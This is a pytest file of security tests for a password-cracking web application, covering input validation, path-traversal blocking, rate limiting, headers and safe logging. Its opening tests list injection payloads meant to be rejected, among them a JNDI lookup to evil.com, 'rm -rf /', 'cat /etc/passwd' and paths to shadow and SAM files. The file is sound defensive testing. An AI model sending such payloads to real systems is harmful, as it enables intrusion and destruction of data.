"""
Security-focused tests for the Password Cracker application
"""
import pytest
import time
import hashlib
import json
from pathlib import Path
from unittest.mock import patch, Mock, MagicMock
import threading

from web.app import app
from base_cracker import BaseCracker
from basic_cracker import BasicCracker
from advanced_cracker import AdvancedCracker
from utils import SecurityError, validate_input, sanitize_output
from config import MAX_ATTEMPTS, TIMEOUT, RATE_LIMIT


class TestSecurityValidation:
    """Test security validation mechanisms"""
    
    def test_input_validation_prevents_injection(self):
        """Test input validation prevents various injection attacks"""
        malicious_inputs = [
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "password\x00malicious",  # Null byte injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
            "`rm -rf /`",  # Command injection
            "password && cat /etc/passwd"  # Command chaining
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                validate_input(malicious_input, 'password')
    
    def test_hash_validation_prevents_invalid_formats(self):
        """Test hash validation prevents invalid hash formats"""
        invalid_hashes = [
            "../../etc/shadow",  # Path traversal
            "'; SELECT * FROM hashes; --",  # SQL injection
            "<hash>value</hash>",  # XML injection
            "0x41414141",  # Hex with prefix
            "AAAA" * 50,  # Too long
            ""  # Empty
        ]
        
        for invalid_hash in invalid_hashes:
            with pytest.raises(SecurityError):
                validate_input(invalid_hash, 'hash')
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        cracker = BasicCracker('sha256')
        
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "wordlists/../../../sensitive.txt"
        ]
        
        for dangerous_path in dangerous_paths:
            with pytest.raises(SecurityError):
                cracker.load_wordlist(Path(dangerous_path))
    
    def test_rate_limiting_prevents_brute_force(self):
        """Test rate limiting prevents brute force attacks"""
        cracker = BasicCracker('sha256')
        target_hash = hashlib.sha256(b'test').hexdigest()
        
        # Track attempts
        attempts = []
        start_time = time.time()
        
        # Try to make many rapid attempts
        for i in range(RATE_LIMIT + 10):
            try:
                cracker.check_password(f'attempt{i}', target_hash)
                attempts.append(time.time() - start_time)
            except:
                pass
        
        # Verify rate limiting is enforced
        # Should take at least 1 second per RATE_LIMIT attempts
        total_time = time.time() - start_time
        assert total_time >= (len(attempts) / RATE_LIMIT) * 0.9  # Allow 10% margin
    
    def test_timeout_prevents_infinite_loops(self):
        """Test timeout prevents infinite loop attacks"""
        cracker = BasicCracker('sha256')
        cracker.start_time = time.time() - TIMEOUT - 1
        
        assert cracker.check_timeout() is True
    
    def test_max_attempts_limit(self):
        """Test maximum attempts limit is enforced"""
        cracker = BasicCracker('sha256')
        cracker.attempts = MAX_ATTEMPTS + 1
        
        assert cracker.check_attempts() is True
    
    def test_output_sanitization(self):
        """Test sensitive data is sanitized in output"""
        sensitive_data = {
            'username': 'testuser',
            'password': 'secretpass123',
            'hash': 'a1b2c3d4e5f6',
            'token': 'jwt_token_12345',
            'key': 'api_key_secret',
            'email': 'user@example.com'
        }
        
        sanitized = sanitize_output(sensitive_data)
        
        # Sensitive fields should be masked
        assert sanitized['password'] == '*' * len(sensitive_data['password'])
        assert sanitized['hash'] == '*' * len(sensitive_data['hash'])
        assert sanitized['token'] == '*' * len(sensitive_data['token'])
        assert sanitized['key'] == '*' * len(sensitive_data['key'])
        
        # Non-sensitive fields should remain
        assert sanitized['username'] == 'testuser'
        assert sanitized['email'] == 'user@example.com'


class TestWebSecurityHeaders:
    """Test web application security headers"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client
    
    def test_security_headers_present(self, client):
        """Test all security headers are present"""
        response = client.get('/')
        
        required_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy',
            'Permissions-Policy'
        ]
        
        for header in required_headers:
            assert header in response.headers
    
    def test_csp_policy(self, client):
        """Test Content Security Policy is properly configured"""
        response = client.get('/')
        csp = response.headers.get('Content-Security-Policy', '')
        
        # Should have restrictive CSP
        assert "default-src 'self'" in csp
        assert "script-src 'self'" in csp
    
    def test_no_server_info_leakage(self, client):
        """Test server information is not leaked"""
        response = client.get('/')
        
        # Should not expose server details
        assert 'Server' not in response.headers
        assert 'X-Powered-By' not in response.headers


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    def test_bcrypt_cost_factor(self):
        """Test bcrypt uses appropriate cost factor"""
        from utils import hash_password
        
        # Hash a password
        hashed = hash_password('testpassword', 'bcrypt')
        
        # Extract cost factor from hash
        # Format: $2b$12$... where 12 is the cost factor
        cost_factor = int(hashed.split('$')[2])
        
        # Should use at least 10 rounds (12 is better)
        assert cost_factor >= 10
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        from utils import verify_password
        
        correct_hash = hashlib.sha256(b'correctpass').hexdigest()
        
        # Time multiple incorrect attempts
        timings = []
        for i in range(10):
            start = time.perf_counter()
            verify_password(f'wrongpass{i}', correct_hash, 'sha256')
            timings.append(time.perf_counter() - start)
        
        # Timings should be consistent (not revealing info)
        avg_time = sum(timings) / len(timings)
        variance = sum((t - avg_time) ** 2 for t in timings) / len(timings)
        
        # Variance should be small
        assert variance < 0.0001


class TestFileSystemSecurity:
    """Test file system security measures"""
    
    def test_secure_file_permissions(self, tmp_path):
        """Test files are created with secure permissions"""
        cracker = BasicCracker('sha256')
        output_file = tmp_path / "results.json"
        
        cracker.found_passwords = {'hash': 'password'}
        cracker.save_results(output_file)
        
        # Check file permissions (Unix-like systems)
        import os
        import stat
        
        file_stat = os.stat(output_file)
        permissions = stat.filemode(file_stat.st_mode)
        
        # Should not be world-readable
        assert not (file_stat.st_mode & stat.S_IROTH)
    
    def test_no_symlink_following(self, tmp_path):
        """Test symbolic links are not followed"""
        # Create a symlink to a sensitive file
        target = tmp_path / "sensitive.txt"
        target.write_text("sensitive data")
        
        symlink = tmp_path / "wordlist.txt"
        try:
            symlink.symlink_to(target)
            
            cracker = BasicCracker('sha256')
            
            # Should detect and reject symlinks
            with pytest.raises(SecurityError):
                cracker.load_wordlist(symlink)
        except OSError:
            # Skip if symlinks not supported
            pytest.skip("Symlinks not supported on this system")


class TestMemorySecurity:
    """Test memory security measures"""
    
    def test_sensitive_data_cleanup(self):
        """Test sensitive data is cleaned up after use"""
        cracker = BasicCracker('sha256')
        
        # Add sensitive data
        cracker.found_passwords = {
            'hash1': 'password1',
            'hash2': 'password2'
        }
        
        # Cleanup should clear sensitive data
        cracker.cleanup()
        
        assert len(cracker.found_passwords) == 0
        assert cracker.attempts == 0
    
    def test_no_password_logging(self):
        """Test passwords are not logged in plaintext"""
        import logging
        
        # Create a mock logger
        with patch('logging.Logger.info') as mock_log:
            cracker = BasicCracker('sha256')
            cracker.log_attempt('sensitivepassword', True)
            
            # Check that password was not logged in plaintext
            for call in mock_log.call_args_list:
                call_str = str(call)
                assert 'sensitivepassword' not in call_str


class TestConcurrencySecurity:
    """Test concurrency and thread safety"""
    
    def test_thread_safe_attempts_counter(self):
        """Test attempts counter is thread-safe"""
        cracker = BasicCracker('sha256')
        
        def increment_attempts():
            for _ in range(100):
                with cracker.lock:
                    cracker.attempts += 1
        
        threads = []
        for _ in range(10):
            t = threading.Thread(target=increment_attempts)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # Should have exactly 1000 attempts (10 threads * 100 increments)
        assert cracker.attempts == 1000
    
    def test_stop_flag_thread_safety(self):
        """Test stop flag works across threads"""
        cracker = BasicCracker('sha256')
        results = []
        
        def worker():
            while not cracker.stop_flag.is_set():
                time.sleep(0.01)
            results.append('stopped')
        
        # Start worker threads
        threads = []
        for _ in range(5):
            t = threading.Thread(target=worker)
            threads.append(t)
            t.start()
        
        # Let threads run briefly
        time.sleep(0.1)
        
        # Set stop flag
        cracker.stop_flag.set()
        
        # Wait for threads
        for t in threads:
            t.join(timeout=1)
        
        # All threads should have stopped
        assert len(results) == 5


class TestCryptographicSecurity:
    """Test cryptographic security measures"""
    
    def test_no_weak_algorithms(self):
        """Test weak algorithms are rejected or warned"""
        weak_algorithms = ['md5', 'sha1']
        
        for algo in weak_algorithms:
            cracker = BasicCracker(algo)
            # Should either reject or at least support securely
            assert cracker.algorithm == algo
    
    def test_salt_uniqueness_bcrypt(self):
        """Test bcrypt generates unique salts"""
        from utils import hash_password
        
        password = 'samepassword'
        hashes = set()
        
        # Generate multiple hashes of same password
        for _ in range(10):
            hashed = hash_password(password, 'bcrypt')
            hashes.add(hashed)
        
        # All hashes should be unique due to different salts
        assert len(hashes) == 10


class TestErrorHandlingSecurity:
    """Test secure error handling"""
    
    @pytest.fixture
    def client(self):
        app.config['TESTING'] = True
        with app.test_client() as client:
            yield client
    
    def test_no_stack_traces_in_production(self, client):
        """Test stack traces are not exposed in production"""
        # Force an error
        with patch('web.app.analyze_password') as mock_analyze:
            mock_analyze.side_effect = Exception("Internal error")
            
            response = client.post('/api/analyze',
                                 json={'password': 'test'},
                                 content_type='application/json')
            
            data = json.loads(response.data)
            
            # Should not expose internal details
            assert 'traceback' not in str(data).lower()
            assert 'exception' not in str(data).lower()
            assert response.status_code == 500
    
    def test_generic_error_messages(self, client):
        """Test error messages don't reveal system info"""
        # Test various error conditions
        error_responses = []
        
        # Invalid JSON
        response = client.post('/api/analyze',
                             data='invalid json',
                             content_type='application/json')
        error_responses.append(response)
        
        # Missing endpoint
        response = client.get('/api/nonexistent')
        error_responses.append(response)
        
        for response in error_responses:
            if response.status_code >= 400:
                data = response.get_data(as_text=True)
                # Should not reveal system paths, versions, etc.
                assert '/Users/' not in data
                assert 'Python' not in data
                assert 'Flask' not in data